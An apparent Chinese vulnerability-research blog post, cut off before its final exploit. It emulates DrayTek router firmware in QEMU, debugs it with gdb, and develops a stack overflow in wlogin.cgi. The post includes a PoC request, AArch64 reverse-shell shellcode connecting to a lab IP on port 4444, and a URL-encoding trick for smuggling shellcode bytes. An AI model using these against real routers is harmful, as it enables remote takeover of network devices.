class="line">ethtool -K qemu-wan gso off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#for telnet from linux to drayos 192.168.1.1</span></span><br><span class="line">ethtool -K br-lan tx off</span><br></pre></td></tr></table></figure>

<p>然后构造启动脚本，首先按照参考文章的提示，修改自带的启动脚本，当尝试启动文中提到的版本<code>(4.3.1)</code>时一切正常，但启动新版时会出现错误</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[qemu_ivshmem_write_internal:<span class="number">2729</span>] already wait <span class="keyword">for</span> more than 100ms, check host.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Drv software rebooting : cmd=1, fun=check_max_portmap_sessions, line=31874 ##</span></span><br><span class="line"></span><br><span class="line"> dump_backtrace: fp:<span class="number">0x467ffe60</span>, pc:<span class="number">0x4064fc48</span></span><br><span class="line">Call trace: <span class="number">0x4064fc48</span> <span class="number">0x406fac58</span> <span class="number">0x404757a8</span> <span class="number">0x407bb120</span> <span class="number">0x407dfec4</span> <span class="number">0x406fbe84</span> <span class="number">0x406fb304</span> <span class="number">0x406fb250</span> <span class="number">0x40000c08</span> <span class="number">0x40000078</span> <span class="number">0x40000040</span></span><br><span class="line">reboot handler <span class="keyword">not</span> init yet</span><br><span class="line">Init MAX session <span class="number">300000</span> </span><br><span class="line">portmap addr_range <span class="number">0x1c9c380</span> &gt; exmem_portmap_end_addr <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"> !!! NULL, malloc Portmap memory fail</span><br><span class="line"> dray_nat_allocate_memory : malloc memory fail</span><br></pre></td></tr></table></figure>

<p>通过逆向分析发现和 <code>portmap </code>内存有关系，而这块内存又和参数 <code>memsize </code>有关，因此尝试将 <code>memsize </code>值修改为 <code>1</code></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># <span class="number">1.</span> <span class="keyword">do</span> <span class="string">&quot;fw_setenv purelinux 1&quot;</span> first , <span class="keyword">then</span> reboot</span><br><span class="line"># <span class="number">2.</span> <span class="keyword">do</span> setup_qemu_linux.sh (default P3 as WAN, P4 as LAN, <span class="keyword">for</span> both <span class="number">1</span>Gbps connection only)</span><br><span class="line"># <span class="number">3.</span> remember to recover to normal mode by <span class="string">&quot;fw_setenv purelinux 0&quot;</span></span><br><span class="line"></span><br><span class="line">rangen() &#123;</span><br><span class="line">   printf <span class="string">&quot;%02x&quot;</span> `shuf -i <span class="number">1</span><span class="number">-255</span> -n <span class="number">1</span>`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rangen1() &#123;</span><br><span class="line">   printf <span class="string">&quot;%x&quot;</span> `shuf -i <span class="number">1</span><span class="number">-15</span> -n <span class="number">1</span>`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wan_mac()&#123;</span><br><span class="line">        idx=$<span class="number">1</span></span><br><span class="line">        printf <span class="string">&quot;%02x\n&quot;</span> $((<span class="number">0</span>x$&#123;C&#125;+<span class="number">0</span>x$idx)) | tail -c <span class="number">3</span> # <span class="number">3</span> = <span class="number">2</span> digit + <span class="number">1</span> terminating character</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A=$(rangen); B=$(rangen); C=$(rangen);</span><br><span class="line">LAN_MAC=<span class="string">&quot;00:1d:aa:$&#123;A&#125;:$&#123;B&#125;:$&#123;C&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -p serial0 ]; <span class="keyword">then</span></span><br><span class="line">    mkfifo serial0</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ ! -p serial1 ]; <span class="keyword">then</span></span><br><span class="line">    mkfifo serial1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">platform_path=<span class="string">&quot;./platform&quot;</span></span><br><span class="line">echo <span class="string">&quot;x86&quot;</span> &gt; $platform_path</span><br><span class="line">enable_kvm_path=<span class="string">&quot;./enable_kvm&quot;</span></span><br><span class="line">echo <span class="string">&quot;kvm&quot;</span> &gt; $enable_kvm_path</span><br><span class="line"></span><br><span class="line">cfg_path=<span class="string">&quot;./magic_file&quot;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;GCI_SKIP&quot;</span> &gt; gci_magic</span><br><span class="line"></span><br><span class="line">mkdir -p ../data/uffs</span><br><span class="line">touch ../data/uffs/v3910_ram_flash.bin</span><br><span class="line">uffs_flash=<span class="string">&quot;../data/uffs/v3910_ram_flash.bin&quot;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;1&quot;</span> &gt; memsize</span><br><span class="line"></span><br><span class="line">(sleep <span class="number">20</span> &amp;&amp; ethtool -K qemu-lan tx off) &amp;</span><br><span class="line"></span><br><span class="line">model=<span class="string">&quot;./model&quot;</span></span><br><span class="line">echo <span class="string">&quot;3&quot;</span> &gt; ./model</span><br><span class="line"></span><br><span class="line">rm -rf ./app &amp;&amp; mkdir -p ./app/gci</span><br><span class="line">GCI_PATH=<span class="string">&quot;./app/gci&quot;</span></span><br><span class="line">GCI_FAIL=<span class="string">&quot;./app/gci_exp_fail&quot;</span></span><br><span class="line">GDEF_FILE=<span class="string">&quot;$GCI_PATH/draycfg.def&quot;</span></span><br><span class="line">GEXP_FLAG=<span class="string">&quot;$GCI_PATH/EXP_FLAG&quot;</span></span><br><span class="line">GEXP_FILE=<span class="string">&quot;$GCI_PATH/draycfg.exp&quot;</span></span><br><span class="line">GDEF_FILE_ADDR=<span class="string">&quot;0x4de0000&quot;</span></span><br><span class="line">GEXP_FLAG_ADDR=<span class="string">&quot;0x55e0000&quot;</span></span><br><span class="line">GEXP_FILE_ADDR=<span class="string">&quot;0x55e0010&quot;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;0#&quot;</span> &gt; $GEXP_FLAG</span><br><span class="line">echo <span class="string">&quot;19831026&quot;</span> &gt; $GEXP_FILE</span><br><span class="line">echo <span class="string">&quot;GCI_SKIP&quot;</span> &gt; $GDEF_FILE</span><br><span class="line"></span><br><span class="line">SHM_SIZE=<span class="number">16777216</span></span><br><span class="line">./qemu-system-aarch64 -M virt,gic_version=<span class="number">3</span> -cpu cortex-a57 -m <span class="number">1024</span> -L ../usr/share/qemu \</span><br><span class="line">           -kernel ./vqemu/sohod64.bin $serial_option -dtb DrayTek \</span><br><span class="line">           -nographic $gdb_serial_option $gdb_remote_option \</span><br><span class="line">           -device virtio-net-pci,netdev=network-lan,mac=$&#123;LAN_MAC&#125; \</span><br><span class="line">           -netdev tap,id=network-lan,ifname=qemu-lan,script=no,downscript=no \</span><br><span class="line">           -device virtio-net-pci,netdev=network-wan,mac=<span class="number">00</span>:<span class="number">1</span>d:aa:$&#123;A&#125;:$&#123;B&#125;:$(wan_mac <span class="number">1</span>) \</span><br><span class="line">           -netdev tap,id=network-wan,ifname=qemu-wan,script=no,downscript=no \</span><br><span class="line">           -device virtio-serial-pci -chardev pipe,id=ch0,<span class="built_in">path</span>=serial0 \</span><br><span class="line">           -device virtserialport,chardev=ch0,name=serial0 \</span><br><span class="line">           -device loader,file=$platform_path,addr=<span class="number">0x25fff0</span> \</span><br><span class="line">           -device loader,file=$cfg_path,addr=<span class="number">0x260000</span> \</span><br><span class="line">           -device loader,file=$uffs_flash,addr=<span class="number">0x00be0000</span> \</span><br><span class="line">           -device loader,file=$enable_kvm_path,addr=<span class="number">0x25ffe0</span> \</span><br><span class="line">           -device loader,file=memsize,addr=<span class="number">0x25ff67</span> \</span><br><span class="line">                -device loader,file=$model,addr=<span class="number">0x25ff69</span> \</span><br><span class="line">           -device loader,file=$GDEF_FILE,addr=$GDEF_FILE_ADDR \</span><br><span class="line">           -device loader,file=$GEXP_FLAG,addr=$GEXP_FLAG_ADDR \</span><br><span class="line">           -device loader,file=$GEXP_FILE,addr=$GEXP_FILE_ADDR \</span><br><span class="line">           -device nec-usb-xhci,id=usb \</span><br><span class="line">           -device ivshmem-plain,memdev=hostmem \</span><br><span class="line">           -object memory-backend-file,size=$&#123;SHM_SIZE&#125;,share,mem-<span class="built_in">path</span>=/dev/shm/ivshmem,id=hostmem</span><br></pre></td></tr></table></figure>

<p>添加<code>-s -S </code>参数开放一个<code>gdb</code>调试端口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 1. do &quot;fw_setenv purelinux 1&quot; first , then reboot</span></span><br><span class="line"><span class="comment"># 2. do setup_qemu_linux.sh (default P3 as WAN, P4 as LAN, for both 1Gbps connection only)</span></span><br><span class="line"><span class="comment"># 3. remember to recover to normal mode by &quot;fw_setenv purelinux 0&quot;</span></span><br><span class="line"></span><br><span class="line">rangen() &#123;</span><br><span class="line">   printf <span class="string">&quot;%02x&quot;</span> `shuf -i <span class="number">1</span>-<span class="number">255</span> -n <span class="number">1</span>`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rangen1() &#123;</span><br><span class="line">   printf <span class="string">&quot;%x&quot;</span> `shuf -i <span class="number">1</span>-<span class="number">15</span> -n <span class="number">1</span>`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wan_mac()&#123;</span><br><span class="line">        idx=$<span class="number">1</span></span><br><span class="line">        printf <span class="string">&quot;%02x\n&quot;</span> $((0x$&#123;C&#125;+0x$idx)) | tail -c <span class="number">3</span> <span class="comment"># 3 = 2 digit + 1 terminating character</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A=$(rangen); B=$(rangen); C=$(rangen);</span><br><span class="line">LAN_MAC=<span class="string">&quot;00:1d:aa:$&#123;A&#125;:$&#123;B&#125;:$&#123;C&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -p serial0 ]; then</span><br><span class="line">    mkfifo serial0</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ ! -p serial1 ]; then</span><br><span class="line">    mkfifo serial1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">platform_path=<span class="string">&quot;./platform&quot;</span></span><br><span class="line">echo <span class="string">&quot;x86&quot;</span> &gt; $platform_path</span><br><span class="line">enable_kvm_path=<span class="string">&quot;./enable_kvm&quot;</span></span><br><span class="line">echo <span class="string">&quot;kvm&quot;</span> &gt; $enable_kvm_path</span><br><span class="line"></span><br><span class="line">cfg_path=<span class="string">&quot;./magic_file&quot;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;GCI_SKIP&quot;</span> &gt; gci_magic</span><br><span class="line"></span><br><span class="line">mkdir -p ../data/uffs</span><br><span class="line">touch ../data/uffs/v3910_ram_flash.<span class="built_in">bin</span></span><br><span class="line">uffs_flash=<span class="string">&quot;../data/uffs/v3910_ram_flash.bin&quot;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;1&quot;</span> &gt; memsize</span><br><span class="line"></span><br><span class="line">(sleep <span class="number">20</span> &amp;&amp; ethtool -K qemu-lan tx off) &amp;</span><br><span class="line"></span><br><span class="line">model=<span class="string">&quot;./model&quot;</span></span><br><span class="line">echo <span class="string">&quot;3&quot;</span> &gt; ./model</span><br><span class="line"></span><br><span class="line">rm -rf ./app &amp;&amp; mkdir -p ./app/gci</span><br><span class="line">GCI_PATH=<span class="string">&quot;./app/gci&quot;</span></span><br><span class="line">GCI_FAIL=<span class="string">&quot;./app/gci_exp_fail&quot;</span></span><br><span class="line">GDEF_FILE=<span class="string">&quot;$GCI_PATH/draycfg.def&quot;</span></span><br><span class="line">GEXP_FLAG=<span class="string">&quot;$GCI_PATH/EXP_FLAG&quot;</span></span><br><span class="line">GEXP_FILE=<span class="string">&quot;$GCI_PATH/draycfg.exp&quot;</span></span><br><span class="line">GDEF_FILE_ADDR=<span class="string">&quot;0x4de0000&quot;</span></span><br><span class="line">GEXP_FLAG_ADDR=<span class="string">&quot;0x55e0000&quot;</span></span><br><span class="line">GEXP_FILE_ADDR=<span class="string">&quot;0x55e0010&quot;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;0#&quot;</span> &gt; $GEXP_FLAG</span><br><span class="line">echo <span class="string">&quot;19831026&quot;</span> &gt; $GEXP_FILE</span><br><span class="line">echo <span class="string">&quot;GCI_SKIP&quot;</span> &gt; $GDEF_FILE</span><br><span class="line"></span><br><span class="line">SHM_SIZE=<span class="number">16777216</span></span><br><span class="line">./qemu-system-aarch64 -M virt,gic_version=<span class="number">3</span> -cpu cortex-a57 -s -S -m <span class="number">1024</span> -L ../usr/share/qemu \</span><br><span class="line">           -kernel ./vqemu/sohod64.<span class="built_in">bin</span> $serial_option -dtb DrayTek \</span><br><span class="line">           -nographic $gdb_serial_option $gdb_remote_option \</span><br><span class="line">           -device virtio-net-pci,netdev=network-lan,mac=$&#123;LAN_MAC&#125; \</span><br><span class="line">           -netdev tap,<span class="built_in">id</span>=network-lan,ifname=qemu-lan,script=no,downscript=no \</span><br><span class="line">           -device virtio-net-pci,netdev=network-wan,mac=<span class="number">00</span>:1d:aa:$&#123;A&#125;:$&#123;B&#125;:$(wan_mac <span class="number">1</span>) \</span><br><span class="line">           -netdev tap,<span class="built_in">id</span>=network-wan,ifname=qemu-wan,script=no,downscript=no \</span><br><span class="line">           -device virtio-serial-pci -chardev pipe,<span class="built_in">id</span>=ch0,path=serial0 \</span><br><span class="line">           -device virtserialport,chardev=ch0,name=serial0 \</span><br><span class="line">           -device loader,file=$platform_path,addr=<span class="number">0x25fff0</span> \</span><br><span class="line">           -device loader,file=$cfg_path,addr=<span class="number">0x260000</span> \</span><br><span class="line">           -device loader,file=$uffs_flash,addr=<span class="number">0x00be0000</span> \</span><br><span class="line">           -device loader,file=$enable_kvm_path,addr=<span class="number">0x25ffe0</span> \</span><br><span class="line">           -device loader,file=memsize,addr=<span class="number">0x25ff67</span> \</span><br><span class="line">                -device loader,file=$model,addr=<span class="number">0x25ff69</span> \</span><br><span class="line">           -device loader,file=$GDEF_FILE,addr=$GDEF_FILE_ADDR \</span><br><span class="line">           -device loader,file=$GEXP_FLAG,addr=$GEXP_FLAG_ADDR \</span><br><span class="line">           -device loader,file=$GEXP_FILE,addr=$GEXP_FILE_ADDR \</span><br><span class="line">           -device nec-usb-xhci,<span class="built_in">id</span>=usb \</span><br><span class="line">           -device ivshmem-plain,memdev=hostmem \</span><br><span class="line">           -<span class="built_in">object</span> memory-backend-file,size=$&#123;SHM_SIZE&#125;,share,mem-path=/dev/shm/ivshmem,<span class="built_in">id</span>=hostmem</span><br></pre></td></tr></table></figure>

<p><code>gdb</code>连接</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># gdb-multiarch </span><br><span class="line">gef➤  set architecture aarch64</span><br><span class="line">The target architecture is assumed to be aarch64</span><br><span class="line">gef➤  set endian little </span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">gef➤  file sohod64.bin </span><br><span class="line">Reading symbols from sohod64.bin...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> sohod64.bin)</span><br><span class="line">gef➤  target remote <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span>:<span class="number">1234</span></span><br><span class="line">Remote debugging using <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>启动时先执行 <code>network.sh</code>，随后执行 <code>myrun.sh</code>，访问 <code>192.168.1.1</code> 即可看到登录页面</p>
<p><img src="/images/hMnhmbnlqS0ZIZWduY2ExWmdvTF.png" alt="img"></p>
<p>默认登录密码：<code>admin/admin</code></p>
<p><img src="/images/EFNUGhUczFxTU9nZkpfVG9.png" alt="img"></p>
<p>端口服务扫描</p>
<p><img src="/images/AzMDE4ODI6MTc0MDMwNTQ4Ml.png" alt="img"></p>
<p>连接<code>telnet</code>，登录用户名&#x2F;密码：<code>admin/admin</code>，<code>web</code>端登录密码</p>
<p><img src="/images/Y2I4NGIzNWVlZWFjOWY2MmMwM.png" alt="img"></p>
<h3 id="poc-exp"><a href="#poc-exp" class="headerlink" title="poc&#x2F;exp"></a>poc&#x2F;exp</h3><p>经过调试发现，程序调用执行流为：<code>sub_40141AF0-&gt;sub_40CD6528-&gt;sub_40BC1690</code></p>
<p>此时堆栈图如下：其中<code>ret_addr3</code>是我们可以覆盖的地址</p>
<p><img src="/images/image-20250223171527934.png" alt="image-20250223171527934"></p>
<p>堆栈细节图如下：我们可以构造多对<code>&amp;key=value&amp;</code>进行溢出，最终覆盖<code>ret_addr</code>，但需要注意的是栈上保存的是<code>key_addr</code>或者<code>value_addr</code>都是.reserved段的地址，导致不能将<code>ret_addr</code>覆盖为任意值</p>
<p><img src="/images/image-20250223171542730.png" alt="image-20250223171542730"></p>
<h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/cgi-bin/wlogin.cgi?a=1&amp;a=2&amp;a=3&amp;a=4&amp;a=5&amp;a=6&amp;a=7&amp;a=8&amp;a=9&amp;a=10&amp;a=11&amp;a=12&amp;a=13&amp;a=14&amp;a=15&amp;a=16&amp;a=17&amp;a=18&amp;a=19&amp;a=20&amp;a=21&amp;[shellcode]</span><br></pre></td></tr></table></figure>

<p>返回地址<code>x30</code>寄存器被控，<code>0x4da2ffc0</code>地址为<code>.reserved</code>段地址</p>
<p><img src="/images/FhYTQ1YjVfa3hqYlduRTN1RU16YnU3akhxazNCNURvdHdIdGZyYzZfVG9rZW46VnRxamJJaUZYb1pXZGh4dVdNOGNZandXbndmXzE3NDAzMDE4ODI6MTc0.png" alt="img"></p>
<p><img src="/images/hIZnl4VWFtY2NCbkpvbjFmXzE3NDAzMDE4ODI6MTc0MDMwNTQ4Ml9WNA.png" alt="img"></p>
<p>程序下一步跳转到<code>0x4da2ffc0</code>地址</p>
<p><img src="/images/DAzMDE4ODI6MTc0MDMwNTQ4Ml9WNA.png" alt="img"></p>
<p>经过调试发现<code>.reserved</code>段地址有执行权限</p>
<p><img src="/images/VjOTExYzUyODA0NzU1YjJfcjlkblNRNnp.png" alt="img"></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>思路：</p>
<p> 一：由于<code>.reserved</code>段地址有执行权限直接执行<code>shellcode</code></p>
<p> 二：利用<code>shellcode</code>跳转到<code>CVE-2024-41585</code></p>
<p> 三：利用<code>shellcode</code>构造<code>ROP</code>重置密码之类的操作</p>
<h5 id="采用思路一：（不通）"><a href="#采用思路一：（不通）" class="headerlink" title="采用思路一：（不通）"></a>采用思路一：（不通）</h5><p><code>shellcode</code>：设计一个<code>socket</code>客户端，主动向目标服务器端口链接，下面是一个整体思路框架</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    <span class="comment">// 创建 socket: socket(AF_INET, SOCK_STREAM, 0)</span></span><br><span class="line">    mov x0, <span class="number">0x2</span>             <span class="comment">// AF_INET (IPv4)</span></span><br><span class="line">    mov x1, <span class="number">0x1</span>             <span class="comment">// SOCK_STREAM (TCP)</span></span><br><span class="line">    mov x2, <span class="number">0x0</span>             <span class="comment">// IPPROTO_IP</span></span><br><span class="line">    mov x8, <span class="number">198</span>             <span class="comment">// 系统调用号 for socket</span></span><br><span class="line">    svc #<span class="number">0</span>                  <span class="comment">// 执行系统调用</span></span><br><span class="line">    mov x19, x0             <span class="comment">// 保存 socket 描述符到 x19</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到目标地址: connect(sock, (struct sockaddr*)&amp;addr, sizeof(addr))</span></span><br><span class="line">    adr x1, sockaddr        <span class="comment">// x1 = 指向 sockaddr 的指针</span></span><br><span class="line">    mov x2, <span class="number">0x10</span>            <span class="comment">// x2 = sizeof(struct sockaddr)</span></span><br><span class="line">    mov x8, <span class="number">203</span>             <span class="comment">// 系统调用号 for connect</span></span><br><span class="line">    svc #<span class="number">0</span>                  <span class="comment">// 执行系统调用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重定向标准输入、输出、错误到 dup3(sock, 2, 0); dup3(sock, 1, 0); dup3(sock, 0, 0);</span></span><br><span class="line">    mov x0, x19             <span class="comment">// socket 描述符</span></span><br><span class="line">    mov x8, <span class="number">24</span>              <span class="comment">// 系统调用号 for dup2</span></span><br><span class="line">    mov x2, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    mov x1, <span class="number">2</span>               <span class="comment">// 标准输入 (stderr)</span></span><br><span class="line">    svc #<span class="number">0</span>                  <span class="comment">// 执行系统调用</span></span><br><span class="line"></span><br><span class="line">    mov x1, <span class="number">1</span>               <span class="comment">// 标准输出 (stdout)</span></span><br><span class="line">    svc #<span class="number">0</span>                  <span class="comment">// 执行系统调用</span></span><br><span class="line"></span><br><span class="line">    mov x1, <span class="number">0</span>               <span class="comment">// 标准错误 (stdin)</span></span><br><span class="line">    svc #<span class="number">0</span>                  <span class="comment">// 执行系统调用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行 /bin/sh: execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], NULL)</span></span><br><span class="line">    adr x0, binsh           <span class="comment">// x0 = 指向 &quot;/bin/sh&quot; 的指针</span></span><br><span class="line">    mov x1, <span class="number">0x0</span>             <span class="comment">// argv = NULL</span></span><br><span class="line">    mov x2, <span class="number">0x0</span>             <span class="comment">// envp = NULL</span></span><br><span class="line">    mov x8, <span class="number">221</span>             <span class="comment">// 系统调用号 for execve</span></span><br><span class="line">    svc #<span class="number">0</span>                  <span class="comment">// 执行系统调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// struct sockaddr_in addr</span></span><br><span class="line"><span class="comment">//.align 16                   // 16 字节对齐</span></span><br><span class="line">sockaddr:</span><br><span class="line">    .hword <span class="number">0x2</span>              <span class="comment">// AF_INET (2 bytes)</span></span><br><span class="line">    .hword <span class="number">0x5c11</span>           <span class="comment">// Port number 4444 (2 bytes)</span></span><br><span class="line">    .<span class="type">byte</span> <span class="number">0xc0</span>, <span class="number">0xa8</span>, <span class="number">0x02</span>, <span class="number">0x87</span> <span class="comment">// IP Address 192.168.2.135 in little-endian (4 bytes)</span></span><br><span class="line">    <span class="comment">//.space 8                // 填充剩余的 8 字节，保证16字节对齐</span></span><br><span class="line"></span><br><span class="line">binsh:</span><br><span class="line">    .asciz <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>

<p>由于<code>unescape_url</code>函数对请求进行<code>url</code>解码，如果遇到“<code>%</code>”字符(表示<code>url</code>编码的字符)，它只需要取下面两个字符，将其转换为相应的十六进制值，并直接写 入结果字符串中。例如，字符“<code>%3B</code>”就变成了分号。没有任何检查来确保得到的十六进制值对应于任何已知的字符编码，允许我们利用这种技术偷运<code>shellcode</code>。例如，字符串“<code>%DE%AD%BE%EF</code>”变成了字节数组“<code>\xde\xad\xbe\xef</code>”。同时可以绕过<code>00</code>截断问题</p>
<p><img src="/images/MDE4ODI6MTc0MDMwNTQ4Ml9WNA.png" alt="img"></p>
<p>因此<code>exp</code>如下：</p>
